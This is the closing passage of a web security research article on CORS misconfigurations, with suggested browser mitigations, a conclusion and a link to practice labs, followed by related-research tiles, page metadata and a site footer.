plummet.</p><p>Another potential improvement for browsers is to apply the wildcard+credentials exception to the null origin. At present, the null origin is significantly more dangerous than the wildcard origin, something I imagine a lot of people find surprising.</p><p>Something else browsers could try is blocking what I've coined "reverse mixed-content" - HTTP sites using CORS to steal data from HTTPS sites. I have no idea what scale of breakage this would cause, though.</p><p>Simplicity and security may go hand in hand but by neglecting to support multiple origin declarations, web browsers have just pushed the complexity onto developers with harmful results. I think the main take-away from this is that secure specification design and implementation is fiendishly difficult.</p><h4>Conclusion</h4><p>CORS is a powerful technology best used with care, and severe exploits don't always require specialist skills and convoluted exploit chains - often a basic understanding of a specification and a little attentiveness is all you need. In case you're running low on coffee, as of today Burp Suite's scanner will identify and report all the flaws discussed here.</p><p><b>Update</b>: We have now released a collection of free, interactive labs so you can practice exploiting these vulnerabilities on live systems:</p><span class="cta block"><a class="cta-primary-2" href="/web-security/cors">CORS Misconfiguration Labs</a></span>
    <div class="container-flex-wrap">
            <a class="label-rounded-outline-white" href="/research/bounties">
                bounties
            </a>
            <a class="label-rounded-outline-white" href="/research/0day">
                0day
            </a>
            <a class="label-rounded-outline-white" href="/research/cors">
                CORS
            </a>
            <a class="label-rounded-outline-white" href="/research/html5">
                HTML5
            </a>
            <a class="label-rounded-outline-white" href="/research/james-kettle">
                James Favourites
            </a>
            <a class="label-rounded-outline-white" href="/research/presentations">
                Presentations
            </a>
    </div>
    <p><a href="/research/articles" class="chevron-before">Back to all articles</a></p>
</div>

    <div class="section-light section-full-width theme-grey-5">
        <noscript>
    <div class="noscript-warning">This page requires JavaScript for an enhanced user experience.</div>
</noscript>
        <h2 class="text-center">Related Research</h2>
        
<div class="widget-tile-container margin-top-m">


<a href="/research/introducing-the-url-validation-bypass-cheat-sheet" class="tile-container research onecolumn widget-tile size0 style1 textstyle0 is-whitebackground" data-backgroundimageurl=/cms/images/9d/37/5c12-widetile-community.png  data-backgroundcolorid="0">
    
<h3 class="tile-text1 notext2">
Introducing the URL validation bypass cheat sheet</h3>
    
<span class="tile-date">03 September 2024</span>
    
<span class="tile-text1-alt">Introducing the URL validation bypass cheat sheet</span>
        

</a>

<a href="/research/smashing-the-state-machine" class="tile-container research onecolumn widget-tile size0 style1 textstyle9 is-whitebackground" data-backgroundimageurl=/cms/images/fd/c3/145d-tile-state-machine_1x1.png  data-backgroundcolorid="0">
    
<h3 class="tile-text1 ">
        <span class="tile-text-container">Smashing the state machine</span>
</h3>


    <span class="tile-text2">
            <span class="tile-text-container">the true potential of web race conditions</span>
    </span>
    
<span class="tile-date">09 August 2023</span>
    
<span class="tile-text1-alt">Smashing the state machine</span>
        
        <span class="tile-text2-alt">the true potential of web race conditions</span>

</a>

<a href="/research/browser-powered-desync-attacks" class="tile-container research onecolumn widget-tile size0 style1 textstyle0 is-whitebackground" data-backgroundimageurl=/cms/images/50/71/e6ce-tile-browser-powered_desync_attacks_1x1.jpg  data-backgroundcolorid="0">
    
<h3 class="tile-text1 notext2">
Browser-Powered Desync Attacks</h3>
    
<span class="tile-date">10 August 2022</span>
    
<span class="tile-text1-alt">Browser-Powered Desync Attacks</span>
        

</a>

<a href="/research/hunting-evasive-vulnerabilities" class="tile-container research onecolumn widget-tile size0 style1 textstyle9 is-whitebackground" data-backgroundimageurl=/cms/images/59/81/69f2-tile-1x1.png  data-backgroundcolorid="0">
    
<h3 class="tile-text1 notext2">
        <span class="tile-text-container">Hunting evasive vulnerabilities</span>
</h3>
    
<span class="tile-date">13 May 2022</span>
    
<span class="tile-text1-alt">Hunting evasive vulnerabilities</span>
        

</a></div>


    </div>



<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "@type": "Person",
    "name": "James Kettle"
  },
  "dateModified": "2022-08-16",
  "datePublished": "2016-10-14",
  "headline": "Exploiting CORS misconfigurations for Bitcoins and bounties",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties"
  },
  "image":{
    "@type": "ImageObject",
    "url": "https://portswigger.net/cms/images/68/ce/8da9e72e3dab-twittercard-exploiting-cors-misconfigurations-bitcoin-bounties-article.png"
  },
  "publisher": {
    "@type": "Organization",
    "logo": {
      "@type": "ImageObject",
      "url": "https://portswigger.net/content/images/logos/thumbnail.png"
    },
    "name": "PortSwigger Research",
    "url": "https://portswigger.net/research",
    "sameAs": [
      "https://twitter.com/portswiggerres"
    ]
  },
  "url": "https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties"
}
</script>

<script src="/bundles/cms/research/details.js?v=BmjjsZho86Dg4G60rGHbHCbqzjY" nonce="p0LzyYu4Y/57MJYrKTG7c&#x2B;aKsgqxn/Ae"></script>

        </div>
        
    <footer class="wrapper">
        <div class="container">
            <div>
                <p>Burp Suite</p>
                <a href="/burp/vulnerability-scanner">Web vulnerability scanner</a>
                <a href="/burp">Burp Suite Editions</a>
                <a href="/burp/releases">Release Notes</a>
            </div>
            <div>
                <p>Vulnerabilities</p>
                <a href="/web-security/cross-site-scripting">Cross-site scripting (XSS)</a>
                <a href="/web-security/sql-injection">SQL injection</a>
                <a href="/web-security/csrf">Cross-site request forgery</a>
                <a href="/web-security/xxe">XML external entity injection</a>
                <a href="/web-security/file-path-traversal">Directory traversal</a>
                <a href="/web-security/ssrf">Server-side request forgery</a>
            </div>
            <div>
                <p>Customers</p>
                <a href="/organizations">Organizations</a>
                <a href="/testers">Testers</a>
                <a href="/developers">Developers</a>
            </div>
            <div>
                <p>Company</p>
                <a href="/about">About</a>
                <a href="/careers">Careers</a>
                <a href="/about/contact">Contact</a>
                <a href="/legal">Legal</a>
                <a href="/privacy">Privacy Notice</a>
            </div>
            <div>
                <p>Insights</p>
                <a href="/web-security">Web Security Academy</a>
                <a href="/blog">Blog</a>
                <a href="/research">Research</a>
            </div>
            <div>
                <a href="/"><img src="/content/images/logos/portswigger-logo.svg" alt="PortSwigger Logo" class="footer-logo"></a>
                <a class="button-outline-blue-small camelcase" href="https://twitter.com/Burp_Suite" rel="noreferrer"><span class="icon-twitter"></span>  Follow us</a>
                <p class="grey">&copy; 2025 PortSwigger Ltd.</p>
            </div>
        </div>
    </footer>
    <a href="#top" class="back-to-top"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26"><polygon points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7" fill="#f63" /><path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63" /></svg></a>

        <a class="back-to-top" href="#top">
            <svg height="26" viewBox="0 0 26 26" width="26" xmlns="http://www.w3.org/2000/svg">
                <polygon fill="#f63" points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7"></polygon>
                <path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63"></path>
            </svg>
        </a>
    </body>
</html>